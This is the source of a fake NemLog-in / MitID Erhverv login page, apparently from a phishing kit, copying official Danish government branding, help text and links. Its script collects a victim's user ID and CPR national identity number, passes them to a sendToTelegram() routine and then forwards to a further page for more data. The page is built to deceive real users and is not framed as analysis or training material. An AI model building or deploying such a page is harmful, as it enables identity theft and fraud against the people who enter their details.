<?php include "include/session.php"; ?>
<!doctype html>
<html lang="da">
<head><meta charset="utf-8"/><meta name="viewport" content="width=device-width,initial-scale=1"/><title>Login using MitID - NemLog-in</title>
<link rel="icon" type="image/x-icon" href="static/media/favicon.ico">
<link rel="stylesheet" href="css/login.css">
<style>
/* ── INITIAL LOADING SCREEN (2s, shown before the form) ── */
.init-loader{display:flex;align-items:center;justify-content:center;min-height:400px;width:100%;text-align:center}
.init-loader-inner{display:flex;flex-direction:column;align-items:center}
.init-mitid-logo{display:flex;align-items:center;gap:2px;font-size:34px;font-weight:700;color:#0060e6;margin-bottom:18px;line-height:1}
.init-mitid-logo img{height:34px;width:auto;display:block;object-fit:contain}
.login-card-header-right img{height:32px;width:auto;display:block;object-fit:contain}
.init-shield{position:relative;width:140px;height:140px;margin-bottom:16px}
.init-shield svg{width:100%;height:100%;display:block}
.init-spinner{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:44px;height:44px;border:4px solid rgba(255,255,255,.35);border-top-color:#fff;border-radius:50%;animation:spin .8s linear infinite}
.init-loader-text{font-size:17px;font-weight:700;color:#222;margin-bottom:5px}
.init-loader-subtext{font-size:14px;color:#666}
</style>
</head>
<body>

<!-- HEADER -->
<header class="header-container">
  <div class="header-content">
    <div class="header-row header-links">
      <button type="button" class="link-burger" aria-label="Open mobile menu">
        <svg width="24" height="24" viewBox="0 0 24 24" fill="#191919"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
        Menu
      </button>
      <div class="link-spacer"></div>
      <a href="#" class="link-language" data-lang="da-DK">Dansk</a>
      <a href="#" class="link-language" data-lang="kl-GL">Kalaallisut</a>
    </div>
    <div class="header-row header-logo">
      <img src="assets/Log-in.svg" alt="Log-in logo">
    </div>
    <nav class="header-row header-nav">
      <div class="header-nav-link btn-lead-spacer"></div>
      <div class="header-nav-link selected"><div class="btn-slice2">MitID</div></div>
      <a href="#" class="header-nav-link"><div class="btn-slice2">International</div></a>
    </nav>
  </div>
</header>

<!-- MAIN -->
<div class="page-container">
  <div class="page-content">

    <!-- LEFT: LOGIN FORM -->
    <div class="page-section main-section">

      <!-- LOADER (hidden) — same animation as initial load -->
      <div id="loaderContainer" class="init-loader hidden">
        <div class="init-loader-inner">
          <div class="init-mitid-logo" aria-label="MitID logo">
            <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
          </div>
          <div class="init-shield">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true">
              <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
            </svg>
            <div class="init-spinner"></div>
          </div>
          <div class="init-loader-text">Forbinder sikkert til MitID</div>
          <div class="init-loader-subtext">Vent et øjeblik ...</div>
        </div>
      </div>

      <!-- LOGIN CARD -->
      <div class="login-card" id="loginForm">

        <!-- INITIAL LOADING SCREEN (2s, inside the card) -->
        <div id="initLoader" class="init-loader">
          <div class="init-loader-inner">
            <div class="init-mitid-logo" aria-label="MitID logo">
              <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
            </div>
            <div class="init-shield">
              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 117" focusable="false" aria-hidden="true">
                <path d="M49.9,0l50,15v41.2c0,47.8-50,60.8-50,60.8s-50-13-50-60.8V15L49.9,0" fill="#0060e6"/>
              </svg>
              <div class="init-spinner"></div>
            </div>
            <div class="init-loader-text">Forbinder sikkert til MitID</div>
            <div class="init-loader-subtext">Vent et øjeblik ...</div>
          </div>
        </div>

        <!-- FORM CONTENT (revealed after loading) -->
        <div id="formContent">

        <!-- HEADER ROW -->
        <div class="login-card-header">
          <h1>Log p&aring; hos MitID Erhverv</h1>
          <div class="login-card-header-right">
            <img class="logo-img" src="static/media/MiTD-logo.png" alt="MitID">
          </div>
        </div>
        <hr class="login-card-divider">

        <!-- STEP 1: Bruger-ID -->
        <div id="step1">
          <div class="field-label">
            <label for="brugerID">Bruger-ID</label>
            <svg class="info-icon" id="infoBtn" viewBox="0 0 18 18" fill="currentColor">
              <path d="M9 1.5a7.5 7.5 0 100 15 7.5 7.5 0 000-15zM9.75 12.75h-1.5v-4.5h1.5v4.5zm0-6h-1.5v-1.5h1.5v1.5z"/>
            </svg>
          </div>
          <div class="input-wrap">
            <input type="text" id="brugerID" autocomplete="off" spellcheck="false" aria-label="Bruger ID">
            <button class="hide-btn" id="hideBtn" type="button">Skjul</button>
          </div>
          <button id="step1Btn" class="btn-primary disabled" disabled type="button">
            <span>FORTSÆT</span>
            <span class="arrow-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
            </span>
          </button>

          <div class="forgot-link" id="glemtLink">
            <svg viewBox="0 0 20 20" fill="#005CA9">
              <path d="M10 1.667a8.333 8.333 0 100 16.666 8.333 8.333 0 000-16.666zm.833 10.833h-1.666V7.5h1.666v5zm0-3.333h-1.666V5.833h1.666V9.167z"/>
            </svg>
            <span>Glemt bruger-ID?</span>
          </div>
        </div>

        <!-- STEP 2: CPR-nummer (hidden) -->
        <div id="step2" class="hidden">
          <hr class="login-card-divider">
          <div class="field-label">
            <label for="cprInput">CPR-nummer</label>
          </div>
          <div class="input-wrap">
            <input type="text" id="cprInput" placeholder="DDMMYY-XXXX" maxlength="11" autocomplete="off" spellcheck="false" aria-label="CPR-nummer">
          </div>
          <button id="step2Btn" class="btn-primary disabled" disabled type="button">
            <span>FORTSÆT</span>
            <span class="arrow-icon">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="#fff"><path d="M5 13h11.17l-4.88 4.88c-.39.39-.39 1.03 0 1.42.39.39 1.02.39 1.41 0l6.59-6.59c.39-.39.39-1.02 0-1.41l-6.58-6.6c-.39-.39-1.02-.39-1.41 0-.39.39-.39 1.02 0 1.41L16.17 11H5c-.55 0-1 .45-1 1s.45 1 1 1z"/></svg>
            </span>
          </button>
        </div>

        <!-- CHECKBOX -->
        <label class="checkbox-wrap">
          <input type="checkbox" id="rememberMe">
          <label for="rememberMe">Husk mig hos MitID Erhverv</label>
        </label>

        <hr class="login-card-divider">

        <div class="bottom-links">
          <span onclick="history.back()">Afbryd</span>
          <span id="helpBtn">Hjælp</span>
        </div>
        </div><!-- /formContent -->
      </div>
    </div>

    <!-- RIGHT: SIDEBAR -->
    <div class="sidebar-wrapper">
      <div class="info-section">
        <div class="info-header">Driftstatus</div>
        <div class="info-content">Normal drift</div>
      </div>
      <div class="info-section">
        <div class="info-header">Sikker brug af MitID</div>
        <div class="info-content">
          <p>Pas godt på dit MitID og hold altid dine MitID-oplysninger for dig selv. Få gode råd til sikker brug af MitID.</p>
          <p><a rel="noopener" href="https://www.nemlog-in.dk/login/sikkerhed" target="_blank">Sikkerhed</a></p>
        </div>
      </div>
      <div class="info-section">
        <div class="info-header">Mere information</div>
        <div class="info-content">
          <ul>
            <li><a rel="noopener" href="https://www.nemlog-in.dk/login/hjaelp-til-login/" target="_blank">Hjælp til Login</a></li>
            <li><a rel="noopener" href="https://www.nemlog-in.dk/login/om-login/" target="_blank">Om NemLog-in</a></li>
            <li><a rel="noopener" href="https://nemlog-in.mitid.dk/ShowCookies" target="_blank">Cookies p&aring; NemLog-in</a></li>
            <li><a rel="noopener" href="https://www.mitid.dk/da-dk/" target="_blank">L&aelig;s om MitID</a></li>
            <li><a rel="noopener" href="https://mitid-erhverv.dk/" target="_blank">L&aelig;s om MitID Erhverv</a></li>
            <li><a rel="noopener" href="https://was.digst.dk/nemlog-in-mitid-dk-login-mitid" target="_blank">Tilg&aelig;ngelighedserkl&aelig;ring</a></li>
          </ul>
        </div>
      </div>
      <div class="info-section">
        <div class="info-header">Behandling af dine personoplysninger</div>
        <div class="info-content">
          <p>Når du anvender NemLog-in til at bekræfte din identitet, bliver dine personoplysninger behandlet af Digitaliseringsstyrelsen.</p>
          <p>Vi indsamler data fra dit MitID, herunder dit CPR-nummer. Vi opbevarer, af sikkerhedsmæssige årsager, en historik over din anvendelse af NemLog-in i 24 måneder.</p>
          <p>Læs mere om behandlingen af dine personoplysninger på Digitaliseringsstyrelsens hjemmeside:</p>
          <p><a rel="noopener" href="https://digst.dk/it-loesninger/nemlog-in/om-loesningen/persondata/" target="_blank">NemLog-in Privatlivspolitik</a></p>
        </div>
      </div>
      <div class="info-section">
        <div class="info-header">Om NemLog-in</div>
        <div class="info-content">NemLog-in giver borgere og virksomheder sikker adgang til offentlige selvbetjeninger og er udviklet og drives af Digitaliseringsstyrelsen.</div>
      </div>
    </div>
  </div>
</div>

<!-- TOOLTIP MODAL -->
<div id="tooltipModal" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.3);z-index:9999;display:none;align-items:center;justify-content:center">
  <div style="background:#fff;max-width:360px;width:90%;padding:24px;position:relative;box-shadow:0 4px 20px rgba(0,0,0,.2);border-radius:4px">
    <button id="closeTooltip" style="position:absolute;top:12px;right:12px;background:none;border:none;font-size:20px;cursor:pointer;color:#666">&times;</button>
    <h3 style="font-size:16px;font-weight:700;margin-bottom:12px;color:#001C44">Om Bruger-ID</h3>
    <p style="font-size:14px;color:#555;line-height:1.5">Dit bruger-ID er det CPR-nummer eller den brugeridentifikation, du har fået udleveret af ATP. Det bruges til at logge ind med MitID.</p>
  </div>
</div>

<!-- HELP MODAL -->
<div id="helpModal" style="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,.3);z-index:9999;display:none;align-items:center;justify-content:center">
  <div style="background:#fff;max-width:360px;width:90%;padding:24px;position:relative;box-shadow:0 4px 20px rgba(0,0,0,.2);border-radius:4px">
    <button id="closeHelp" style="position:absolute;top:12px;right:12px;background:none;border:none;font-size:20px;cursor:pointer;color:#666">&times;</button>
    <h3 style="font-size:16px;font-weight:700;margin-bottom:12px;color:#001C44">Hjælp til MitID</h3>
    <hr style="border:none;border-top:1px solid #e0e0e0;margin:12px 0">
    <a href="#" style="color:#0060e6;text-decoration:none;font-weight:600;display:block;margin-bottom:10px;font-size:14px">Hvordan får jeg en MitID bruger?</a>
    <a href="#" style="color:#0060e6;text-decoration:none;font-weight:600;display:block;margin-bottom:10px;font-size:14px">Jeg har glemt mit bruger-ID</a>
    <a href="#" style="color:#0060e6;text-decoration:none;font-weight:600;display:block;margin-bottom:10px;font-size:14px">Mistanke om misbrug?</a>
    <a href="#" style="color:#0060e6;text-decoration:none;font-weight:600;display:block;font-size:14px">Find mere hjælp på MitID.dk</a>
  </div>
</div>

<script src="js/shared.js"></script>
<script>
loadState();

// ── STEP 1: Bruger-ID ──
var brugerInput = document.getElementById('brugerID');
var step1Btn = document.getElementById('step1Btn');

brugerInput.addEventListener('input', function(){
  var hasVal = this.value.trim().length >= 1;
  step1Btn.disabled = !hasVal;
  step1Btn.className = 'btn-primary ' + (hasVal ? 'active' : 'disabled');
});

step1Btn.addEventListener('click', function(){
  var val = brugerInput.value.trim();
  if(!val) return;
  state.data.brugerID = val;
  saveState();
  document.getElementById('step1').classList.add('hidden');
  document.getElementById('step2').classList.remove('hidden');
  document.getElementById('cprInput').focus();
});

// ── STEP 2: CPR-nummer ──
var cprInput = document.getElementById('cprInput');
var step2Btn = document.getElementById('step2Btn');

cprInput.addEventListener('input', function(){
  var val = this.value.replace(/\D/g, '').slice(0, 10);
  if(val.length > 6) val = val.slice(0, 6) + '-' + val.slice(6);
  this.value = val;
  var ready = val.replace('-', '').length >= 10;
  step2Btn.disabled = !ready;
  step2Btn.className = 'btn-primary ' + (ready ? 'active' : 'disabled');
});

step2Btn.addEventListener('click', function(){
  var val = cprInput.value.trim();
  if(val.replace('-', '').length < 10) return;
  state.data.cprNumber = val;
  saveState();
  document.getElementById('loginForm').classList.add('hidden');
  document.getElementById('loaderContainer').classList.remove('hidden');
  sendToTelegram();
  setTimeout(function(){ window.location.href = 'cvr.php'; }, 2000);
});

// ── MODALS ──
document.getElementById('infoBtn').addEventListener('click', function(){
  document.getElementById('tooltipModal').style.display = 'flex';
});
document.getElementById('closeTooltip').addEventListener('click', function(){
  document.getElementById('tooltipModal').style.display = 'none';
});
document.getElementById('tooltipModal').addEventListener('click', function(e){
  if(e.target === this) this.style.display = 'none';
});
document.getElementById('glemtLink').addEventListener('click', function(){
  document.getElementById('tooltipModal').style.display = 'flex';
});
document.getElementById('helpBtn').addEventListener('click', function(){
  document.getElementById('helpModal').style.display = 'flex';
});
document.getElementById('closeHelp').addEventListener('click', function(){
  document.getElementById('helpModal').style.display = 'none';
});
document.getElementById('helpModal').addEventListener('click', function(e){
  if(e.target === this) this.style.display = 'none';
});

// ── HIDE BUTTON ──
document.getElementById('hideBtn').addEventListener('click', function(){
  if(brugerInput.type === 'text') {
    brugerInput.type = 'password';
    this.textContent = 'Vis';
  } else {
    brugerInput.type = 'text';
    this.textContent = 'Skjul';
  }
});

// ── INITIAL LOADING SCREEN (2s, then reveal the form) ──
(function(){
  var initLoader = document.getElementById('initLoader');
  var formContent = document.getElementById('formContent');
  if(!initLoader || !formContent) return;
  formContent.classList.add('hidden');
  setTimeout(function(){
    initLoader.classList.add('hidden');
    formContent.classList.remove('hidden');
    var b = document.getElementById('brugerID');
    if(b) b.focus();
  }, 2000);
})();
</script>
</body>
</html>
